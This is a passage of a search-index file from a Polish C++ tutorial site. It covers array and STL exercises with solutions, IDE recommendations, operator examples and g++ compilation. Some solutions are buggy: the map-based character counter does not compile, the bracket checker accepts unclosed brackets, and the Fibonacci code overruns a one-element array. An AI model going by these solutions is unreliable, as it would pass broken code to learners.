specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-4/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-4/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(t1[n],\\ t2[n]\\) - dwie tablice liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-4/#wynik","title":"Wynik","text":"<ul> <li>Tablica powsta\u0142a poprzez dodanie do siebie warto\u015bci z tablic \\(t1\\) i \\(t2\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-4/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\nint main() {\n  int n;\n\n  cout &lt;&lt; \"Podaj liczbe elementow:\" &lt;&lt; endl;\n  cin &gt;&gt; n;\n\n  int t1[n], t2[n], t3[n];\n\n  for(int i = 0; i &lt; n; i++) {\n    cout &lt;&lt; \"Podaj kolejna wartosc z pierwszej tablicy:\" &lt;&lt; endl;\n    cin &gt;&gt; t1[i];\n  }\n\n  for(int i = 0; i &lt; n; i++) {\n    cout &lt;&lt; \"Podaj kolejna wartosc z drugiej tablicy:\" &lt;&lt; endl;\n    cin &gt;&gt; t2[i];\n  }\n\n  for(int i = 0; i &lt; n; i++) {\n    t3[i] = t1[i] + t2[i];\n  }\n\n  cout &lt;&lt; \"Wynikowa tablica: \";\n  for(int i = 0; i &lt; n; i++) {\n    cout &lt;&lt; t3[i] &lt;&lt; \" \";\n  }\n\n  cout &lt;&lt; endl;\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-5/","title":"Rozwi\u0105zanie 5","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-5/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-5/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-5/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-5/#wynik","title":"Wynik","text":"<ul> <li>\\(fib[n]\\) - tablica zawieraj\u0105ca \\(n\\) kolejnych liczb Fibonacciego</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-5/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\nint main() {\n  int n;\n\n  cout &lt;&lt; \"Podaj liczbe elementow:\" &lt;&lt; endl;\n  cin &gt;&gt; n;\n\n  int fib[n];\n\n  fib[0] = 1;\n  fib[1] = 1;\n\n  for(int i = 2; i &lt; n; i++) {\n    fib[i] = fib[i - 1] + fib[i - 2];\n  }\n\n  cout &lt;&lt; \"Kolejne liczby Fibonacciego: \";\n  for(int i = 0; i &lt; n; i++) {\n    cout &lt;&lt; fib[i] &lt;&lt; \" \";\n  }\n\n  cout &lt;&lt; endl;\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-6/","title":"Rozwi\u0105zanie 6","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-6/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-6/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-6/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-6/#wynik","title":"Wynik","text":"<ul> <li>\\(mno[n][n]\\) - dwuwymiarowa tablica reprezentuj\u0105ca tabliczk\u0119 mno\u017cenia liczb z zakresu \\([0,n-1]\\), gdzie \\(mno[i][j]=i*j\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-6/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\nint main() {\n  int n;\n\n  cout &lt;&lt; \"Podaj liczbe elementow:\" &lt;&lt; endl;\n  cin &gt;&gt; n;\n\n  int mno[n][n];\n\n  for(int i = 0; i &lt; n; i++) {\n    for(int j = 0; j &lt; n; j++) {\n      mno[i][j] = i * j;\n    }\n  }\n\n  cout &lt;&lt; \"Tabliczka mnozenia: \";\n  for(int i = 0; i &lt; n; i++) {\n    for(int j = 0; j &lt; n; j++) {\n      cout &lt;&lt; mno[i][j] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n  }\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-7/","title":"Rozwi\u0105zanie 7","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-7/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-7/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-7/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(tab[n]\\) - tablica liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-7/#wynik","title":"Wynik","text":"<ul> <li>Komunikat \"niemalejaco\" je\u017celi elementy tablicy posortowane s\u0105 niemalej\u0105co</li> <li>Komunikat \"nierosnaco\" je\u017celi elementy tablicy posortowane s\u0105 nierosn\u0105co</li> <li>Komunikat \"nieposortowane\" je\u017celi elementy tablicy nie s\u0105 posortowane</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-7/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\nint main() {\n  int n;\n  bool niemalejaco = true;\n  bool nierosnaco = true;\n\n  cout &lt;&lt; \"Podaj liczbe elementow:\" &lt;&lt; endl;\n  cin &gt;&gt; n;\n\n  int tab[n];\n\n  for(int i = 0; i &lt; n; i++) {\n    cout &lt;&lt; \"Podaj kolejna wartosc:\" &lt;&lt; endl;\n    cin &gt;&gt; tab[i];\n  }\n\n  for(int i = 1; i &lt; n; i++) {\n    if(tab[i] &gt; tab[i - 1]) {\n      nierosnaco = false;\n    }\n\n    if(tab[i] &lt; tab[i - 1]) {\n      niemalejaco = false;\n    }\n  }\n\n  if(nierosnaco) {\n    cout &lt;&lt; \"nierosnaco\" &lt;&lt; endl;\n  } else if(niemalejaco) {\n    cout &lt;&lt; \"niemalejaco\" &lt;&lt; endl;\n  } else {\n    cout &lt;&lt; \"nieposortowane\" &lt;&lt; endl;\n  }\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/stl/","title":"STL","text":""},{"location":"programming/c%2B%2B/exercises/stl/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. W implementacji wykorzystaj klas\u0119 <code>map</code>.</p>"},{"location":"programming/c%2B%2B/exercises/stl/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/stl/#dane","title":"Dane","text":"<ul> <li>\\(txt\\) - Wielolinijkowy tekst sk\u0142adaj\u0105cy si\u0119 ze znak\u00f3w ze standardowej tablicy ASCII, zako\u0144czony znakiem ko\u0144ca wyj\u015bcia.</li> </ul>"},{"location":"programming/c%2B%2B/exercises/stl/#wynik","title":"Wynik","text":"<ul> <li>Dla ka\u017cdego znaku, jaki pojawi\u0142 si\u0119 na wej\u015bciu, liczba jego wyst\u0105pie\u0144. Znaki uporz\u0105dkowane alfabetycznie, zgodnie z kolejno\u015bci\u0105 w tablicy ASCII.</li> </ul>"},{"location":"programming/c%2B%2B/exercises/stl/#przykad","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/stl/#dane_1","title":"Dane","text":"<pre><code>txt := \"Ala ma kota\"\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/stl/#wynik_1","title":"Wynik","text":"<pre><code>  - 2\nA - 1\na - 3\nk - 1\nl - 1\nm - 1\no - 1\nt - 1\n</code></pre> <p>Info</p> <p>Pierwszy znak na powy\u017cszej li\u015bcie to spacja.</p>"},{"location":"programming/c%2B%2B/exercises/stl/#zadanie-2","title":"Zadanie 2","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. W implementacji wykorzystaj klas\u0119 <code>stack</code>.</p>"},{"location":"programming/c%2B%2B/exercises/stl/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/stl/#dane_2","title":"Dane","text":"<ul> <li>\\(nawiasy\\) - ci\u0105g sk\u0142adaj\u0105cy si\u0119 jedynie ze znak\u00f3w reprezentuj\u0105cych nawiasy okr\u0105g\u0142e i kwadratowe, tzn.: \\((, ), [, ]\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/stl/#wynik_2","title":"Wynik","text":"<ul> <li>TRUE je\u017celi podany na wej\u015bciu ci\u0105g jest reprezentacj\u0105 poprawnego nawiasowania, FALSE w przeciwnym przypadku.</li> </ul>"},{"location":"programming/c%2B%2B/exercises/stl/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"programming/c%2B%2B/exercises/stl/#dane_3","title":"Dane","text":"<pre><code>nawiasy := \"(([]()))\"\n</code></pre> <p>Wynik: TRUE</p>"},{"location":"programming/c%2B%2B/exercises/stl/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"programming/c%2B%2B/exercises/stl/#dane_4","title":"Dane","text":"<pre><code>nawiasy := \"(([(])))\"\n</code></pre> <p>Wynik: FALSE</p>"},{"location":"programming/c%2B%2B/exercises/stl/#zadanie-3","title":"Zadanie 3","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. W implementacji wykorzystaj tablic\u0119 dynamiczn\u0105 z STL.</p>"},{"location":"programming/c%2B%2B/exercises/stl/#specyfikacja_2","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/stl/#dane_5","title":"Dane","text":"<ul> <li>\\(instrukcje\\) - ci\u0105g instrukcji opisany poni\u017cej, zako\u0144czony instrukcj\u0105 KONIEC</li> </ul>"},{"location":"programming/c%2B%2B/exercises/stl/#wynik_3","title":"Wynik","text":"<ul> <li>Warto\u015b\u0107 zadanego elementu wypisana dla ka\u017cdej instrukcji WYPISZ, lub komunikat BLAD, je\u017celi ci\u0105g instrukcji zawiera b\u0142\u0105d</li> </ul>"},{"location":"programming/c%2B%2B/exercises/stl/#instrukcje","title":"Instrukcje","text":"<p>Wszystkie warto\u015bci s\u0105 liczbami ca\u0142kowitymi mieszcz\u0105cymi si\u0119 w typie <code>int</code>.</p> <ul> <li>DODAJ \\(x\\) - dopisz warto\u015b\u0107 \\(x\\) na koniec tablicy</li> <li>USUN - usu\u0144 ostatni element z tablicy</li> <li>WSTAW \\(x\\) NA \\(i\\) - wstaw warto\u015b\u0107 \\(x\\) na pozycj\u0119 \\(i\\) (numerowane od \\(0\\))</li> <li>SORTUJ \\(i\\) \\(j\\) - posortuj tablic\u0119 rosn\u0105co od elementu pod indeksem \\(i\\) do elementu pod indeksem \\(j\\) w\u0142\u0105cznie</li> <li>WYPISZ \\(i\\) - wypisz warto\u015b\u0107 zapisan\u0105 pod indeksem \\(i\\)</li> <li>KONIEC - zako\u0144cz obliczenia (instrukcja ta wyst\u0119puje tylko raz, na samym ko\u0144cu ci\u0105gu instrukcji)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/stl/#przykad-1_1","title":"Przyk\u0142ad 1","text":""},{"location":"programming/c%2B%2B/exercises/stl/#dane_6","title":"Dane","text":"<pre><code>DODAJ 3\nDODAJ 2\nDODAJ 10\nWSTAW 1 NA 2\nWYPISZ 3\nUSUN\nSORTUJ 0 2\nWYPISZ 0\nWYPISZ 1\nWYPISZ 2\nKONIEC\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/stl/#wynik_4","title":"Wynik","text":"<pre><code>10\n1\n2\n3\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/stl/#przykad-2_1","title":"Przyk\u0142ad 2","text":""},{"location":"programming/c%2B%2B/exercises/stl/#dane_7","title":"Dane","text":"<pre><code>DODAJ 3\nDODAJ 2\nDODAJ 10\nWSTAW 1 NA 2\nWYPISZ 3\nUSUN\nSORTUJ 0 3\nWYPISZ 0\nWYPISZ 1\nWYPISZ 2\nKONIEC\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/stl/#wynik_5","title":"Wynik","text":"<pre><code>10\nBLAD\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/stl/solution-1/","title":"Rozwi\u0105zanie 1","text":""},{"location":"programming/c%2B%2B/exercises/stl/solution-1/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. W implementacji wykorzystaj klas\u0119 <code>map</code>.</p>"},{"location":"programming/c%2B%2B/exercises/stl/solution-1/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/stl/solution-1/#dane","title":"Dane","text":"<ul> <li>\\(txt\\) - Wielolinijkowy tekst sk\u0142adaj\u0105cy si\u0119 ze znak\u00f3w ze standardowej tablicy ASCII, zako\u0144czony znakiem ko\u0144ca wyj\u015bcia.</li> </ul>"},{"location":"programming/c%2B%2B/exercises/stl/solution-1/#wynik","title":"Wynik","text":"<ul> <li>Dla ka\u017cdego znaku, jaki pojawi\u0142 si\u0119 na wej\u015bciu, liczba jego wyst\u0105pie\u0144. Znaki uporz\u0105dkowane alfabetycznie, zgodnie z kolejno\u015bci\u0105 w tablicy ASCII.</li> </ul>"},{"location":"programming/c%2B%2B/exercises/stl/solution-1/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;map&gt;\n\nusing namespace std;\n\nint main() {\n    string txt;\n    map&lt;string, int&gt; charCounter;\n\n    while(getline(cin, txt) &amp;&amp; !cin.eof()) {\n        for(auto ch : txt) {\n            charCounter[ch]++;\n        }\n    }\n\n    for(auto el : charCounter) {\n        cout &lt;&lt; el.first &lt;&lt; \" - \" &lt;&lt; el.second &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/stl/solution-2/","title":"Rozwi\u0105zanie 2","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. W implementacji wykorzystaj klas\u0119 <code>stack</code>.</p>"},{"location":"programming/c%2B%2B/exercises/stl/solution-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/stl/solution-2/#dane","title":"Dane","text":"<ul> <li>\\(nawiasy\\) - ci\u0105g sk\u0142adaj\u0105cy si\u0119 jedynie ze znak\u00f3w reprezentuj\u0105cych nawiasy okr\u0105g\u0142e i kwadratowe, tzn.: \\((, ), [, ]\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/stl/solution-2/#wynik","title":"Wynik","text":"<ul> <li>TRUE je\u017celi podany na wej\u015bciu ci\u0105g jest reprezentacj\u0105 poprawnego nawiasowania, FALSE w przeciwnym przypadku.</li> </ul>"},{"location":"programming/c%2B%2B/exercises/stl/solution-2/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;stack&gt;\n\nusing namespace std;\n\nint main() {\n    string brackets;\n    stack&lt;char&gt; st;\n    bool ok = true;\n\n    cin &gt;&gt; brackets;\n\n    for (auto ch : brackets) {\n        if (ch == '(' || ch == '[') {\n            st.push(ch);\n        } else if (ch == ']') {\n            if (st.empty() || st.top() != '[') {\n                ok = false;\n                break;\n            }\n\n            st.pop();\n        } else {\n            if (st.empty() || st.top() != '(') {\n                ok = false;\n                break;\n            }\n\n            st.pop();\n        }\n    }\n\n    if (ok) {\n        cout &lt;&lt; \"TRUE\" &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; \"FALSE\" &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/","title":"Wprowadzenie","text":"<p>Danger</p>"},{"location":"programming/c%2B%2B/introduction/#uwaga","title":"Uwaga","text":"<p>To nie jest tutorial programowania. Za\u0142o\u017cenie jest takie, \u017ce wiesz ju\u017c co nieco o programowaniu, by\u0107 mo\u017ce znasz inny j\u0119zyk programowania i chcesz si\u0119 dowiedzie\u0107 jak podstawowe konstrukcje wygl\u0105daj\u0105 w j\u0119zyku C++.</p> <p>Nie b\u0119dziemy tutaj t\u0142umaczy\u0107 czym jest p\u0119tla czy instrukcja warunkowe, a jedynie poka\u017cemy, jak te konstrukcje wygl\u0105daj\u0105 w j\u0119zyku C++.</p> <p>Je\u017celi dopiero zaczynasz, zapoznaj si\u0119 najpierw z wprowadzeniem do algorytm\u00f3w: Wprowadzenie</p>"},{"location":"programming/c%2B%2B/introduction/#srodowiska-lokalne","title":"\u015arodowiska lokalne","text":""},{"location":"programming/c%2B%2B/introduction/#codeblocks","title":"Code::Blocks","text":"<p>Dobre \u015brodowisko dla pocz\u0105tkuj\u0105cych. \u0141atwe w obs\u0142udze, przejrzyste i darmowe. Pozwala zar\u00f3wno tworzy\u0107 rozbudowane projekty, jak i proste aplikacje konsolowe.</p>"},{"location":"programming/c%2B%2B/introduction/#instalacja","title":"Instalacja","text":"<p>Pobieramy \u015brodowisko ze strony https://www.codeblocks.org/downloads/binaries/. Mo\u017cemy zainstalowa\u0107 samo \u015brodowisko, lub razem w pakiecie z kompilatorem. W celu instalacji pe\u0142nego zestawu, tzn. \u015brodowisko plus kompilator, wybieramy wersj\u0119 z mingw, np. codeblocks-20.03mingw-setup.exe.</p>"},{"location":"programming/c%2B%2B/introduction/#dev-c","title":"Dev-C++","text":"<p>Kolejne dobre i darmowe \u015brodowisko dla pocz\u0105tkuj\u0105cych. W swoich mo\u017cliwo\u015bciach podobne do omawianego \u015brodowiska Code::Blocks.</p>"},{"location":"programming/c%2B%2B/introduction/#instalacja_1","title":"Instalacja","text":"<p>Pobieramy plik instalacyjny ze strony http://bloodshed.net/. Podobnie jak wy\u017cej, mo\u017cemy zainstalowa\u0107 samo \u015brodowisko, lub razem z kompilatorem mingw.</p>"},{"location":"programming/c%2B%2B/introduction/#visual-studio","title":"Visual Studio","text":"<p>Rozbudowane i pot\u0119\u017cne \u015brodowisko stworzone przez Microsoft. Polecane dla do\u015bwiadczonych programist\u00f3w. W przypadku tworzenia aplikacji w j\u0119zyku C++ nale\u017cy mie\u0107 na uwadze, \u017ce Visual Studio do\u0142\u0105cza w\u0142asne biblioteki.</p>"},{"location":"programming/c%2B%2B/introduction/#instalacja_2","title":"Instalacja","text":"<p>Instalator pobierzemy ze strony: https://visualstudio.microsoft.com/. Dost\u0119pnych jest kilka wersji do pobrania, zar\u00f3wno p\u0142atne jak i bezp\u0142atna. Do standardowych, \"domowych\" zastosowa\u0144 wystarczy wersja darmowa, tzn. Community Edition.</p>"},{"location":"programming/c%2B%2B/introduction/#visual-studio-code","title":"Visual Studio Code","text":"<p>U swoich podstaw Visual Studio Code to edytor tekstu, co\u015b jak rozbudowany notatnik. To co jednak go wyr\u00f3\u017cnia, to mo\u017cliwo\u015b\u0107 rozbudowania za pomoc\u0105 najr\u00f3\u017cniejszych dodatk\u00f3w/plugin\u00f3w. Lekkie, przyjemne, darmowe i z ogromnymi mo\u017cliwo\u015bciami. Wymaga troch\u0119 czasu, aby nauczy\u0107 si\u0119 z niego efektywnie korzysta\u0107, ale warto.</p>"},{"location":"programming/c%2B%2B/introduction/#instalacja_3","title":"Instalacja","text":"<p>Instalator pobierzemy ze strony: https://code.visualstudio.com/.</p>"},{"location":"programming/c%2B%2B/introduction/#clion","title":"CLion","text":"<p>Pot\u0119\u017cne, rozbudowane i (niestety) p\u0142atne narz\u0119dzie stworzone przez JetBrains, przeznaczone przede wszystkim do tworzenia zaawansowanych projekt\u00f3w. Posiada wiele przydatnych narz\u0119dzi dla programist\u00f3w, a tak\u017ce opcji szybkiej refaktoryzacji kodu i wbudowane podpowiedzi. Warto zwr\u00f3ci\u0107 uwag\u0119 na fakt, \u017ce CLion korzysta domy\u015blnie z CMake do konfiguracji i kompilacji projekt\u00f3w.</p> <p>To i inne narz\u0119dzia od firmy JetBrains dost\u0119pne s\u0105 za darmo na licencji edukacyjnej: https://www.jetbrains.com/community/education/#students</p>"},{"location":"programming/c%2B%2B/introduction/#instalacja_4","title":"Instalacja","text":"<p>Narz\u0119dzie pobierzemy ze strony: https://www.jetbrains.com/clion/.</p>"},{"location":"programming/c%2B%2B/introduction/#srodowiska-webowe","title":"\u015arodowiska webowe","text":"<p>W przeciwie\u0144stwie do \u015brodowisk lokalnych, \u015brodowiska webowe dost\u0119pne s\u0105 z poziomu przegl\u0105darki i nie wymagaj\u0105 \u017cadnej dodatkowej instalacji. Ma to oczywi\u015bcie swoje wady i zalety. \u015arodowiska webowe zazwyczaj dzia\u0142aj\u0105 wolniej i maj\u0105 swoje ograniczenia.</p>"},{"location":"programming/c%2B%2B/introduction/#ideone","title":"Ideone","text":"<p>Dosy\u0107 podstawowy kompilator webowy. Posiada wsparcie dla wielu j\u0119zyk\u00f3w. Do jego zalet mo\u017cna zaliczy\u0107 stosunkowo szybk\u0105 kompilacj\u0119 i mo\u017cliwo\u015b\u0107 korzystania bez rejestracji, a tak\u017ce \u0142atwo\u015b\u0107 udost\u0119pniania swoich kod\u00f3w. Do minus\u00f3w mo\u017cna zaliczy\u0107 brak interaktywno\u015bci - ca\u0142e wej\u015bcie musimy wprowadzi\u0107 w specjalnym oknie, przed uruchomieniem programu.</p> <p>https://ideone.com/</p>"},{"location":"programming/c%2B%2B/introduction/#replit","title":"Repl.it","text":"<p>Rozbudowane narz\u0119dzie webowe, kt\u00f3re wymaga jednak utworzenia darmowego konta. Posiada wsparcie dla wielu j\u0119zyk\u00f3w i pozwala na tworzenie rozbudowanych projekt\u00f3w ze z\u0142o\u017con\u0105 struktur\u0105 plik\u00f3w, a tak\u017ce na wprowadzanie w\u0142asnych opcji kompilacji.</p> <p>https://replit.com/</p>"},{"location":"programming/c%2B%2B/introduction/#krotkie-wprowadzenie-do-c-prezentacja","title":"Kr\u00f3tkie wprowadzenie do C++ - prezentacja","text":"<p> Wprowadzenie do C++</p>"},{"location":"programming/c%2B%2B/introduction/#sciaga-dla-zaawansowanych","title":"\u015aci\u0105ga dla zaawansowanych","text":"<p>\u015aci\u0105ga</p>"},{"location":"programming/c%2B%2B/introduction/arithmetics/","title":"Operacje arytmetyczne","text":"<p>W j\u0119zyku C++, tak jak i w wielu innych j\u0119zykach programowania, mamy pewien zestaw operator\u00f3w arytmetycznych. Przyjrzyjmy si\u0119 im.</p>"},{"location":"programming/c%2B%2B/introduction/arithmetics/#podstawowe","title":"Podstawowe","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int a = 5;\n    int b = 2;\n\n    int suma = a + b; // 7\n    int roznica = a - b; // 3\n    int iloczyn = a * b; // 10\n    int iloraz = a / b; // 2\n\n    return 0;\n}\n</code></pre> <p>Info</p> <p>Wynik dzielenia liczb ca\u0142kowitych b\u0119dzie tak\u017ce liczb\u0105 ca\u0142kowit\u0105, tzn. warto\u015bci\u0105 zaokr\u0105glon\u0105 w d\u00f3\u0142.</p>"},{"location":"programming/c%2B%2B/introduction/arithmetics/#dzielenie-rzeczywiste","title":"Dzielenie rzeczywiste","text":"<p>W celu uzyskania rzeczywistego wyniku dzielenia dw\u00f3ch zmiennych typu ca\u0142kowitego, nale\u017cy u\u017cy\u0107 rzutowania na typ rzeczywisty. Przynajmniej jedna z warto\u015bci w dzieleniu musi by\u0107 typu rzeczywistego. Mog\u0105 te\u017c by\u0107 obie.</p> <pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int a = 5;\n    int b = 2;\n\n    double iloraz = (double)a / (double)b; // 2.5\n\n    return 0;\n}\n</code></pre> <p>Wynik dzielenia liczb rzeczywistych jest tak\u017ce liczb\u0105 rzeczywist\u0105, co pokazuje poni\u017cszy przyk\u0142ad.</p> <pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    double a = 5;\n    double b = 2;\n\n    double iloraz = a / b; // 2.5\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/arithmetics/#reszta-z-dzielenia","title":"Reszta z dzielenia","text":"<p>W celu uzyskania reszty z dzielenia dw\u00f3ch zmiennych typu ca\u0142kowitego nale\u017cy u\u017cy\u0107 operatora modulo (<code>%</code>).</p> <pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int a = 5;\n    int b = 2;\n\n    int reszta = a % b; // 1\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/bitwise-operations/","title":"Operacje bitowe","text":""},{"location":"programming/c%2B%2B/introduction/bitwise-operations/#opis-zagadnienia","title":"Opis zagadnienia","text":"<p>bitwise-operations.md</p>"},{"location":"programming/c%2B%2B/introduction/bitwise-operations/#przesuniecie-bitowe","title":"Przesuni\u0119cie bitowe","text":"<p>Do przesuni\u0119cia w lewo stosujemy operator <code>&lt;&lt;</code>.</p> <p>Do przesuni\u0119cia w prawo stosujemy operator <code>&gt;&gt;</code>.</p> <pre><code>int x = 1 &lt;&lt; 10;\ncout &lt;&lt; x &lt;&lt; endl;\n\nx = x &gt;&gt; 10;\ncout &lt;&lt; x &lt;&lt; endl;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/bitwise-operations/#bitowy-and","title":"Bitowy AND","text":"<pre><code>int a = 25;\nint b = 30;\n\nint c = a &amp; b;\n\ncout &lt;&lt; c &lt;&lt; endl;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/bitwise-operations/#bitowy-or","title":"Bitowy OR","text":"<pre><code>int a = 25;\nint b = 30;\n\nint c = a | b;\n\ncout &lt;&lt; c &lt;&lt; endl;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/bitwise-operations/#bitowy-xor","title":"Bitowy XOR","text":"<pre><code>int a = 25;\nint b = 30;\n\nint c = a ^ b;\n\ncout &lt;&lt; c &lt;&lt; endl;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/bitwise-operations/#przykadowa-implementacja","title":"Przyk\u0142adowa implementacja","text":"<p>https://replit.com/@damiankurpiewski/BitOperations</p>"},{"location":"programming/c%2B%2B/introduction/cmd-compilation/","title":"Kompilacja z linii polece\u0144","text":"<p>Kto potrzebuje zaawansowanego \u015brodowiska programistycznego, z kolorowaniem sk\u0142adni, automatycznymi podpowiedziami, rozbudowanym debuggerem, gdy mo\u017cna pisa\u0107 w notatniku i kompilowa\u0107 r\u0119cznie z linii polece\u0144? Mam nadziej\u0119, \u017ce to pytanie retoryczne. Niemniej poka\u017c\u0119, jak kompilowa\u0107 programy napisane w j\u0119zyku C++ z poziomu terminala.</p>"},{"location":"programming/c%2B%2B/introduction/cmd-compilation/#zaprzyjaznij-sie-z-terminalem","title":"Zaprzyja\u017anij si\u0119 z terminalem","text":"<p>Za\u0142\u00f3\u017cmy, \u017ce mamy gotowy program zapisany w pliku main.cpp. Aby go skompilowa\u0107 z linii polece\u0144 wystarczy napisa\u0107:</p> LinuxWindows <pre><code>g++ main.cpp\n</code></pre> <pre><code>g++ main.cpp\n</code></pre> <p>Proste, prawda? Teraz, aby uruchomi\u0107 program, nale\u017cy wykona\u0107 polecenie:</p> LinuxWindows <pre><code>./a.out\n</code></pre> <pre><code>.\\a.exe\n</code></pre> <p>I to by by\u0142o na tyle. Do zobaczenia w innym temacie!</p> <p>Ale zaraz, zaraz... S\u0105 jeszcze opcje, kt\u00f3re mo\u017cemy poda\u0107 do kompilacji. Przedstawi\u0119 kilka z nich, po pe\u0142n\u0105 list\u0119 odsy\u0142am do dokumentacji: https://gcc.gnu.org/onlinedocs/gcc-11.2.0/gcc/#toc-GCC-Command-Options.</p>"},{"location":"programming/c%2B%2B/introduction/cmd-compilation/#opcje","title":"Opcje","text":"<p>Tak jak i w przypadku wielu innych polece\u0144 wywo\u0142ywanych z terminala, opcje podajemy po my\u015blnikach, czasem podw\u00f3jnych.</p>"},{"location":"programming/c%2B%2B/introduction/cmd-compilation/#nazwa-pliku-wykonywalnego","title":"Nazwa pliku wykonywalnego","text":"<p>Je\u017celi chcemy poda\u0107 nazw\u0119 docelowego wyniku kompilacji, mo\u017cemy to zrobi\u0107 za pomoc\u0105 opcji <code>-o</code>.</p> LinuxWindows <pre><code>g++ -o main.out main.cpp\n./main.out\n</code></pre> <pre><code>g++ -o main.exe main.cpp\n.\\main.exe\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/cmd-compilation/#wiecej-warningow","title":"Wi\u0119cej warning\u00f3w!","text":"<p>Je\u017celi chcemy zobaczy\u0107 w konsoli wi\u0119cej warning\u00f3w (masochi\u015bci), mo\u017cemy skorzysta\u0107 z opcji <code>-Wall.</code></p> LinuxWindows <pre><code>g++ -Wall main.cpp\n</code></pre> <pre><code>g++ -Wall main.cpp\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/cmd-compilation/#optymalizacja","title":"Optymalizacja","text":"<p>Pot\u0119\u017cna opcja. W niekt\u00f3rych przypadkach mo\u017ce poprawi\u0107 osi\u0105gi naszego programu.</p> LinuxWindows 